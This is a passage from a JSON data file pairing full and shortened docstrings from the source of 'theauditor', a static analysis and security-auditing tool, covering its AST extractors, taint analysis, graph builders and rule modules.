    "original": "\"\"\"Django web framework extractors (non-ORM patterns).\n\nThis module extracts Django-specific web patterns:\n- Class-Based Views (CBVs): ListView, DetailView, CreateView, UpdateView, DeleteView, etc.\n- Forms: Django Form and ModelForm definitions with field validation\n- Admin: ModelAdmin customizations (list_display, list_filter, search_fields, etc.)\n- Middleware: Middleware class definitions and hooks\n\nARCHITECTURAL CONTRACT:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'view_class_name', 'form_class_name', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\n\"\"\"",
    "truncated": "\"\"\"Django web framework extractors (non-ORM patterns).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/operator_extractors.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Extract matrix multiplication operator (@) usage.\n\n    Detects:\n    - Matrix multiplication: A @ B\n\n    Args:\n        tree: AST tree dictionary\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of matrix multiplication dicts:\n        {\n            'line': int,\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract matrix multiplication operator (@) usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/protocol_extractors.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Extract pickle protocol implementations.\n\n    Detects:\n    - __getstate__, __setstate__, __reduce__, __reduce_ex__\n\n    Returns:\n        List of pickle protocol dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'has_getstate': bool,\n            'has_setstate': bool,\n            'has_reduce': bool,\n            'has_reduce_ex': bool,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract pickle protocol implementations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/protocol_extractors.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Extract class decorators (separate from method decorators).\n\n    Detects:\n    - @dataclass, @total_ordering, custom decorators\n    - Decorator arguments\n\n    Returns:\n        List of class decorator dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'decorator': str,\n            'decorator_type': str,  # 'dataclass' | 'total_ordering' | 'custom'\n            'has_arguments': bool,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract class decorators (separate from method decorators).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/task_graphql_extractors.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Task queue and GraphQL resolver extractors.\n\nThis module extracts async task queue and GraphQL resolver patterns:\n- Celery: Task definitions (@task, @shared_task), task invocations (.delay, .apply_async), Beat schedules\n- GraphQL (Graphene): resolve_* methods in ObjectType classes\n- GraphQL (Ariadne): @query.field, @mutation.field decorators\n- GraphQL (Strawberry): @strawberry.field decorators\n\nARCHITECTURAL CONTRACT:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'task_name', 'resolver_name', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\n\"\"\"",
    "truncated": "\"\"\"Task queue and GraphQL resolver extractors.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/validation_extractors.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Validation and serialization framework extractors.\n\nThis module extracts input validation and data serialization patterns:\n- Pydantic: BaseModel validators (@validator, @root_validator)\n- Marshmallow: Schema definitions and field validations\n- Django REST Framework: Serializers and field definitions\n- WTForms: Form definitions and field validators\n\nARCHITECTURAL CONTRACT:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'model_name', 'field_name', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\n\"\"\"",
    "truncated": "\"\"\"Validation and serialization framework extractors.\"\"\""
  },
  {
    "file": "theauditor/context/explain_formatter.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Explain command output formatter.\n\nFormats comprehensive context output for the `aud explain` command.\nSupports text (human-readable) and JSON (AI-consumable) formats.\n\nNO EMOJIS: Windows Command Prompt uses CP1252 encoding which cannot\nhandle emoji characters. All output uses plain ASCII only.\n\nUsage:\n    from theauditor.context.explain_formatter import ExplainFormatter\n    from theauditor.utils.code_snippets import CodeSnippetManager\n\n    snippet_manager = CodeSnippetManager(Path.cwd())\n    formatter = ExplainFormatter(snippet_manager, show_code=True)\n    output = formatter.format_file_explain(data)\n\"\"\"",
    "truncated": "\"\"\"Explain command output formatter.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Find symbol definitions by exact name match.\n\n        Queries both symbols and symbols_jsx tables for React/JSX support.\n\n        Args:\n            name: Exact symbol name to search for\n            type_filter: Optional type filter (function, class, etc.)\n\n        Returns:\n            List of matching symbols with full context\n\n        Example:\n            symbols = engine.find_symbol(\"authenticateUser\")\n            for sym in symbols:\n                print(f\"{sym.name} at {sym.file}:{sym.line}\")\n        \"\"\"",
    "truncated": "\"\"\"Find symbol definitions by exact name match.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Get import dependencies for a file.\n\n        Uses graphs.db edges table with graph_type='import'.\n\n        Args:\n            file_path: File to query (partial path match)\n            direction: 'incoming', 'outgoing', or 'both'\n\n        Returns:\n            Dict with 'incoming' and/or 'outgoing' dependency lists\n\n        Example:\n            deps = engine.get_file_dependencies(\"src/auth.ts\")\n            print(f\"Imported by: {deps['incoming']}\")\n            print(f\"Imports: {deps['outgoing']}\")\n        \"\"\"",
    "truncated": "\"\"\"Get import dependencies for a file.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"\n    Parse Docker tag into semantic components for proper version comparison.\n\n    Args:\n        tag: Docker tag string (e.g., \"17-alpine3.21\", \"v3.4.1\", \"3.15.0a1-windowsservercore\")\n\n    Returns:\n        Dict with version tuple, variant, and stability, or None if unparseable\n        {\n            'tag': str,              # Original tag\n            'version': tuple,        # (major, minor, patch) for semantic comparison\n            'variant': str,          # Base image variant (alpine, bookworm, etc)\n            'stability': str,        # 'stable', 'alpha', 'beta', 'rc', 'dev'\n            'is_clean': bool         # True if tag has no variant (prefer these)\n        }\n    \"\"\"",
    "truncated": "\"\"\"Parse Docker tag into semantic components for proper version comparison.\"\"\""
  },
  {
    "file": "theauditor/graph/db_cache.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"In-memory cache of database tables for graph building.\n\n    Loads data once at init, provides O(1) lookups during graph construction.\n    Eliminates N+1 query problem where each file triggers separate DB queries.\n\n    Responsibilities:\n    - Bulk load all graph-relevant data (files, imports, exports)\n    - Normalize all paths to forward-slash format internally\n    - Provide O(1) existence checks and lookups\n    - Crash immediately if database missing/malformed (zero fallback policy)\n\n    Performance:\n    - Small project (100 files): ~0.1s load, ~10MB RAM\n    - Medium project (1K files): ~0.5s load, ~50MB RAM\n    - Large project (10K files): ~2s load, ~200MB RAM\n    \"\"\"",
    "truncated": "\"\"\"In-memory cache of database tables for graph building.\"\"\""
  },
  {
    "file": "theauditor/graph/dfg_builder.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Build edges connecting frontend API calls to backend controllers.\n\n        Creates edges from frontend body variables to backend req.body/params/query.\n        This enables cross-boundary taint flow tracking from user inputs in the\n        frontend to API handlers in the backend.\n\n        Example edge:\n            frontend/src/components/Form.tsx::submit::userData ->\n            backend/src/controllers/user.controller.ts::create::req.body\n\n        Args:\n            root: Project root directory (for metadata only)\n\n        Returns:\n            Dict with nodes, edges, and metadata\n        \"\"\"",
    "truncated": "\"\"\"Build edges connecting frontend API calls to backend controllers.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/interceptors.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Look up full ClassName.methodName and controller file path from symbols.\n\n        This bridges the naming gap between InterceptorStrategy and DFGBuilder.\n\n        CRITICAL: The handler is REFERENCED in routes file but DEFINED in controller file.\n        e.g., routes/user.routes.ts references userController.create\n              but UserController.create is defined in controllers/user.controller.ts\n\n        Args:\n            cursor: Database cursor\n            method_name: Short method name (e.g., 'create', 'exportData')\n\n        Returns:\n            Tuple of (full_function_name, controller_file_path)\n            Falls back to (method_name, None) if not found\n        \"\"\"",
    "truncated": "\"\"\"Look up full ClassName.methodName and controller file path from symbols.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/interceptors.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Interceptor Graph Strategy.\n\nWires \"Pre-Flight\" logic (Middleware, Decorators) into the Data Flow Graph.\nThis creates structural edges between Route Entries and Handlers, passing through\nvalidation/auth layers that were previously invisible to the graph walker.\n\nArchitecture:\n- Express Middleware Chains: Route -> Middleware 1 -> Middleware 2 -> Controller\n- Python Decorators: Decorator -> Function (decorator wraps the function)\n\nThis eliminates the need for Taint Analysis to 'guess' if validation happened.\nIt makes validation structurally present in the Data Flow Graph.\n\nNO FALLBACKS. Database-first. If tables don't exist, we skip gracefully\n(strategies are pluggable, not every project has Express or Python).\n\"\"\"",
    "truncated": "\"\"\"Interceptor Graph Strategy.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/graphql_database.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Add a GraphQL resolver mapping record to the batch.\n\n        Maps a GraphQL field to its backend implementation symbol.\n\n        Args:\n            field_id: FK to graphql_fields.field_id\n            resolver_symbol_id: FK to symbols.symbol_id (backend function/method)\n            resolver_path: File path containing resolver implementation\n            resolver_line: Line number of resolver function/method\n            resolver_language: 'javascript', 'typescript', or 'python'\n            binding_style: Resolver pattern - 'apollo-object', 'apollo-class', 'nestjs-decorator',\n                          'graphene-decorator', 'ariadne-decorator', 'strawberry-type', etc.\n            resolver_export: Export name for tracing (optional)\n\n        NO FALLBACKS. Both field_id and resolver_symbol_id MUST exist.\n        \"\"\"",
    "truncated": "\"\"\"Add a GraphQL resolver mapping record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Add a GitHub Actions job record to the batch.\n\n        Args:\n            job_id: Composite PK (workflow_path||':'||job_key)\n            workflow_path: FK to github_workflows\n            job_key: Job key from YAML (e.g., 'build', 'test')\n            job_name: Optional name: field\n            runs_on: JSON array of runner labels (supports matrix)\n            strategy: JSON object of matrix strategy\n            permissions: JSON object of job-level permissions\n            env: JSON object of job-level env vars\n            if_condition: Conditional expression for job execution\n            timeout_minutes: Job timeout\n            uses_reusable_workflow: True if uses: workflow.yml\n            reusable_workflow_path: Path to reusable workflow if used\n        \"\"\"",
    "truncated": "\"\"\"Add a GitHub Actions job record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Extract Nginx config directly to database.\n\n        MINIMAL IMPLEMENTATION: Only detects file presence, no deep parsing.\n\n        Why minimal? nginx_parser.py uses recursive regex (cancer).\n        Options for future:\n        - Option A: Use pyparsing library (6-8 hours)\n        - Option B: Execute nginx -T in sandbox (validate syntax only)\n        - Option C: This minimal approach (rules handle security checks)\n\n        Current: Option C - let rules query nginx_configs for presence only.\n\n        Args:\n            file_path: Path to nginx.conf\n            content: Config content as string\n        \"\"\"",
    "truncated": "\"\"\"Extract Nginx config directly to database.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Extract router.use() mount statements from function calls.\n\n        ADDED 2025-11-09: Phase 6.7 - AST-based route resolution\n\n        Detects patterns like:\n        - router.use('/areas', areaRoutes)\n        - router.use(API_PREFIX, protectedRouter)\n        - protectedRouter.use(`${API_PREFIX}/auth`, authRoutes)\n\n        Args:\n            function_calls: List of function call dictionaries from AST parser\n            file_path: Path to the file being analyzed\n\n        Returns:\n            List of mount dictionaries with router_mounts table fields\n        \"\"\"",
    "truncated": "\"\"\"Extract router.use() mount statements from function calls.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript_resolvers.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Resolve a single import path against indexed files.\n\n    Resolution order:\n    1. Path alias expansion (@/, ~/)\n    2. Relative path resolution (./foo, ../bar)\n    3. Extension/index file variants\n\n    Args:\n        import_path: The import path to resolve (e.g., './utils')\n        from_file: The file containing the import\n        indexed_paths: Set of all indexed file paths\n        path_aliases: Dict of alias -> base path mappings\n\n    Returns:\n        Resolved path if found, None otherwise\n    \"\"\"",
    "truncated": "\"\"\"Resolve a single import path against indexed files.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/python_deps.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Parse a dependency specification into components.\n\n    Handles formats:\n    - package==1.0.0\n    - package>=1.0,<2.0\n    - package~=1.4.2\n    - package[extra1,extra2]==1.0\n    - git+https://github.com/user/repo.git\n    - -e git+https://github.com/user/repo.git#egg=package\n\n    Args:\n        spec: Dependency specification string\n\n    Returns:\n        Dict with name, version, extras, git_url\n    \"\"\"",
    "truncated": "\"\"\"Parse a dependency specification into components.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/sql.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Parse SQL query to extract command type and table names.\n\n    Shared helper used by Python and JavaScript extractors to maintain\n    consistent SQL parsing logic across languages.\n\n    Args:\n        query_text: Raw SQL query string\n\n    Returns:\n        Tuple of (command, tables) if parseable, None if unparseable\n        - command: SQL command type (SELECT, INSERT, UPDATE, etc.)\n        - tables: List of table names referenced in query\n\n    Raises:\n        ImportError: If sqlparse is not installed (hard failure)\n    \"\"\"",
    "truncated": "\"\"\"Parse SQL query to extract command type and table names.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/core_schema.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"\nCore schema definitions - Used by ALL languages.\n\nThis module contains table schemas used across Python, Node, Rust, and all extractors:\n- File tracking (files, config_files, refs)\n- Symbol definitions (symbols, symbols_jsx)\n- Data flow tables (assignments, function_call_args, function_returns)\n- Security patterns (sql_queries, jwt_patterns)\n- Control flow graphs (cfg_blocks, cfg_edges)\n- Findings (findings_consolidated)\n\nDesign Philosophy:\n- Core tables are language-agnostic\n- Used by multiple extractors (Python + Node + Rust)\n- Security-critical patterns (SQL, JWT, taint analysis)\n\"\"\"",
    "truncated": "\"\"\"Core schema definitions - Used by ALL languages.\"\"\""
  },
  {
    "file": "theauditor/insights/graph.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"\n        Calculate interpreted health metrics and grades.\n\n        This method provides SUBJECTIVE health scoring based on\n        architectural best practices. The scoring is opinionated\n        and may not apply to all codebases.\n\n        Args:\n            import_graph: Import/dependency graph\n            cycles: Pre-computed cycles (optional)\n            hotspots: Pre-computed hotspots (optional)\n            layers: Pre-computed layers (optional)\n\n        Returns:\n            Dict with health scores, grades, and metrics\n        \"\"\"",
    "truncated": "\"\"\"Calculate interpreted health metrics and grades.\"\"\""
  },
  {
    "file": "theauditor/insights/graph.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"\n        Generate comprehensive INTERPRETED summary of graph analysis.\n\n        This method combines objective metrics with subjective scoring\n        and recommendations. It's designed for teams that want actionable\n        insights beyond raw data.\n\n        Args:\n            import_graph: Import/dependency graph\n            call_graph: Optional call graph\n            cycles: Pre-computed cycles (optional)\n            hotspots: Pre-computed hotspots (optional)\n\n        Returns:\n            Summary dict with metrics, health scores, and recommendations\n        \"\"\"",
    "truncated": "\"\"\"Generate comprehensive INTERPRETED summary of graph analysis.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/unused_dependencies.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Detect unused dependencies - packages declared but never imported.\n\nUnused dependencies bloat package size, increase installation time, and\ncreate unnecessary security surface area. This rule finds packages that\nare declared in package.json or requirements.txt but never actually used.\n\nDetection Strategy:\n1. Query package_configs for all declared dependencies\n2. Query import_styles for all actual imports\n3. Find declared packages with zero imports\n4. Exclude dev dependencies that may not be directly imported\n\nDatabase Tables Used:\n- package_configs: Declared dependencies from package files\n- import_styles: Actual import/require statements in code\n\"\"\"",
    "truncated": "\"\"\"Detect unused dependencies - packages declared but never imported.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/reusable_workflow_risks.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Build finding for reusable workflow risk.\n\n    Args:\n        workflow_path: Path to calling workflow file\n        workflow_name: Calling workflow display name\n        job_key: Job key\n        job_name: Job display name\n        reusable_path: Full reusable workflow path with version\n        workflow_ref: Reusable workflow reference (org/repo/.github/workflows/x.yml)\n        version: Version/ref used\n        is_mutable: Whether version is mutable\n        secret_count: Number of secrets passed to reusable workflow\n\n    Returns:\n        StandardFinding object\n    \"\"\"",
    "truncated": "\"\"\"Build finding for reusable workflow risk.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Collect and register all taint patterns from rules that define them.\n\n        ARCHITECTURAL FIX: Framework-Aware Pattern Collection\n        This method now FILTERS rules by detected frameworks before registering patterns.\n        Only runs Python rules if Python frameworks detected (Flask, Django, etc.),\n        only runs JavaScript rules if JavaScript frameworks detected (Express, React, etc.).\n\n        This prevents registry pollution (Python patterns matching JavaScript code) and\n        ensures taint analysis only uses relevant patterns for the project's languages.\n\n        Args:\n            registry: TaintRegistry instance to populate with patterns\n\n        Returns:\n            The populated registry\n        \"\"\"",
    "truncated": "\"\"\"Collect and register all taint patterns from rules that define them.\"\"\""
  },
  {
    "file": "theauditor/taint/access_path.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Remove N fields from the end (for reification).\n\n        Used in backward analysis when traversing field stores:\n            x.f.g = y  →  If tracking x.f.g, reify to y\n\n        Args:\n            count: Number of fields to remove\n\n        Returns:\n            New AccessPath with fields removed\n\n        Examples:\n            >>> path = AccessPath(..., base=\"x\", fields=(\"f\", \"g\", \"h\"))\n            >>> path.strip_fields(2)\n            AccessPath(..., base=\"x\", fields=(\"f\",))\n        \"\"\"",
    "truncated": "\"\"\"Remove N fields from the end (for reification).\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Classify a flow path based on sanitization.\n\n        Checks if the path goes through any sanitizers (validation frameworks\n        or safe sinks). Returns SANITIZED if it does, otherwise VULNERABLE.\n\n        The /rules/ directory will later reclassify VULNERABLE flows based on\n        specific security patterns.\n\n        Args:\n            path: Complete flow path from entry to exit\n\n        Returns:\n            Tuple of (status, sanitizer_metadata)\n            - status: \"SANITIZED\" or \"VULNERABLE\"\n            - sanitizer_metadata: Dict with sanitizer details or None\n        \"\"\"",
    "truncated": "\"\"\"Classify a flow path based on sanitization.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Extract variable name from argument expression.\n\n        Args:\n            arg_expr: Argument expression (e.g., \"userInput\", \"req.body\", \"getUser()\")\n\n        Returns:\n            Variable name or access path, None if not parseable\n\n        Examples:\n            \"userInput\" -> \"userInput\"\n            \"req.body\" -> \"req.body\"\n            \"user.data.id\" -> \"user.data.id\"\n            \"getUser()\" -> None (function call)\n            \"'string'\" -> None (literal)\n            \"123\" -> None (literal)\n        \"\"\"",
    "truncated": "\"\"\"Extract variable name from argument expression.\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 16,
    "original": "\"\"\"Terraform Provisioning Flow Graph Builder.\n\nConstructs data flow graphs from Terraform resources, showing how variables,\nresources, and outputs connect through dependencies and interpolations.\n\nArchitecture:\n- Database-first: Reads from repo_index.db terraform_* tables\n- Outputs to graphs.db via XGraphStore.save_custom_graph()\n- Zero fallbacks: Missing data = empty graph (exposes indexer bugs)\n- Same format as DFGBuilder (dataclass → asdict)\n\nUsage:\n    builder = TerraformGraphBuilder(db_path=\".pf/repo_index.db\")\n    graph = builder.build_provisioning_flow_graph(root=\".\")\n    # Returns: {'nodes': [...], 'edges': [...], 'metadata': {...}}\n\"\"\"",
    "truncated": "\"\"\"Terraform Provisioning Flow Graph Builder.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/advanced_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract @cached_property decorator usage.\n\n    Detects:\n    - functools.cached_property\n    - Custom cached_property implementations\n\n    Returns:\n        List of cached property dicts:\n        {\n            'line': int,\n            'method_name': str,\n            'in_class': str,\n            'is_functools': bool,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract @cached_property decorator usage.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/advanced_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract Ellipsis (...) usage patterns.\n\n    Detects:\n    - Ellipsis in type hints\n    - Ellipsis in slicing\n    - Ellipsis as placeholder\n\n    Returns:\n        List of ellipsis usage dicts:\n        {\n            'line': int,\n            'context': str,  # 'type_hint' | 'slice' | 'expression' | 'pass_placeholder'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract Ellipsis (...) usage patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/advanced_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract exec/eval/compile dynamic execution patterns.\n\n    SECURITY NOTE: These patterns are security-sensitive and should be\n    carefully reviewed for potential code injection vulnerabilities.\n\n    Returns:\n        List of dynamic execution dicts:\n        {\n            'line': int,\n            'operation': str,  # 'exec' | 'eval' | 'compile'\n            'has_globals': bool,\n            'has_locals': bool,\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract exec/eval/compile dynamic execution patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/cfg_extractor.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Python Control Flow Graph (CFG) extractor.\n\nThis module contains extraction logic for building control flow graphs from Python functions.\nMatches the pattern of JavaScript's cfg_extractor.js.\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: CFG data with line numbers\n- RETURN: List[Dict] with CFG structures\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\n\"\"\"",
    "truncated": "\"\"\"Python Control Flow Graph (CFG) extractor.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/class_feature_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract descriptor protocol implementations.\n\n    Detects classes with __get__, __set__, __delete__ methods.\n\n    Returns:\n        List of descriptor dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'has_get': bool,\n            'has_set': bool,\n            'has_delete': bool,\n            'descriptor_type': str,  # 'data' | 'non-data' | 'read-only'\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract descriptor protocol implementations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/control_flow_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract async for loop patterns.\n\n    Detects:\n    - else clause\n    - Target count (unpacking)\n\n    Returns:\n        List of async for loop dicts:\n        {\n            'line': int,\n            'has_else': bool,\n            'target_count': int,\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract async for loop patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/control_flow_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract break, continue, and pass statements.\n\n    Detects:\n    - Statement type\n    - Containing loop type (for/while)\n\n    Returns:\n        List of flow control dicts:\n        {\n            'line': int,\n            'statement_type': str,  # 'break' | 'continue' | 'pass'\n            'loop_type': str,  # 'for' | 'while' | 'none'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract break, continue, and pass statements.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/control_flow_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract assert statement patterns.\n\n    Detects:\n    - Message presence\n    - Condition type\n\n    Returns:\n        List of assert statement dicts:\n        {\n            'line': int,\n            'has_message': bool,\n            'condition_type': str,  # 'comparison' | 'isinstance' | 'callable' | 'simple'\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract assert statement patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/control_flow_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract del statement patterns.\n\n    Detects:\n    - Target type (name, subscript, attribute)\n    - Target count\n\n    Returns:\n        List of del statement dicts:\n        {\n            'line': int,\n            'target_type': str,  # 'name' | 'subscript' | 'attribute'\n            'target_count': int,\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract del statement patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/core_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract dict literal structures from Python AST.\n\n    This is the centralized, correct implementation for dict literal extraction.\n    Extracts patterns like:\n    - {'key': value}\n    - {'key': func_ref}\n    - {**spread_dict}\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to the parser instance\n\n    Returns:\n        List of dict property records matching object_literals schema\n    \"\"\"",
    "truncated": "\"\"\"Extract dict literal structures from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/core_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract Python generator patterns.\n\n    Detects:\n    - Generator functions (functions with yield/yield from)\n    - Generator expressions (x for x in iterable)\n    - yield patterns (yield, yield value, yield from)\n    - send() usage (bidirectional communication)\n    - Infinite generators (while True with yield - DoS risk)\n\n    Security relevance:\n    - DoS: Infinite generators without break conditions\n    - Memory leaks: Unclosed generators holding resources\n    - Taint tracking: Data flow through yield/send\n    - Resource exhaustion: Generator expressions in hot paths\n    \"\"\"",
    "truncated": "\"\"\"Extract Python generator patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/data_flow_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract function calls made under conditional execution (Week 2 Data Flow).\n\n    Tracks when functions are called under specific conditions - critical for\n    understanding conditional behavior dependencies in causal learning.\n\n    Detects:\n    - Functions called only within if/elif/else blocks\n    - Guard clauses (early returns based on validation)\n    - Exception-dependent code paths\n    - Nested conditional execution\n\n    Expected extraction from TheAuditor: ~400 conditional calls\n\n    Example hypothesis: \"delete_all_users() is only called when user.is_admin is True\"\n    \"\"\"",
    "truncated": "\"\"\"Extract function calls made under conditional execution (Week 2 Data Flow).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_web_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Extract Django Class-Based View definitions.\n\n    Detects:\n    - Generic views (ListView, DetailView, CreateView, UpdateView, DeleteView, etc.)\n    - Model associations (model = User or queryset = User.objects.all())\n    - Permission decorators on dispatch() method\n    - get_queryset() overrides (SQL injection surface)\n    - http_method_names restrictions\n    - template_name attributes\n\n    Security relevance:\n    - Missing permission checks = access control bypass\n    - get_queryset() overrides = SQL injection surface\n    - http_method_names = attack surface enumeration\n    \"\"\"",
    "truncated": "\"\"\"Extract Django Class-Based View definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/framework_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"Framework extractors - Backward-compatible facade.\n\nThis module re-exports all framework extraction functions from domain-specific modules.\nExisting code using `from framework_extractors import extract_*` will continue working.\n\nNew code should import directly from domain modules for clarity:\n  from .orm_extractors import extract_sqlalchemy_definitions\n  from .validation_extractors import extract_pydantic_validators\n  from .django_web_extractors import extract_django_cbvs\n  from .task_graphql_extractors import extract_celery_tasks\n\nREFACTOR NOTE:\nThis file was reduced from 2222 lines to ~150 lines as part of refactor-framework-extractors-domain-split.\nAll implementation moved to domain-specific files. This file now serves as a re-export facade only.\n\"\"\"",
    "truncated": "\"\"\"Framework extractors - Backward-compatible facade.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/orm_extractors.py",
    "line": -1,
    "original_lines": 15,
    "original": "\"\"\"ORM framework extractors - SQLAlchemy and Django ORM.\n\nThis module extracts database ORM patterns:\n- SQLAlchemy: Models, fields, relationships (1:1, 1:N, M:N)\n- Django ORM: Models, relationships, ForeignKey/ManyToMany\n- Flask: Blueprints (TEMPORARY - will move to flask_extractors.py in future PR)\n\nARCHITECTURAL CONTRACT:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'model_name', 'field_name', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\n\"\"\"",
    "truncated": "\"\"\"ORM framework extractors - SQLAlchemy and Django ORM.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/protocol_extractors.py",
    "line": -1,
    "original_lines": 15,
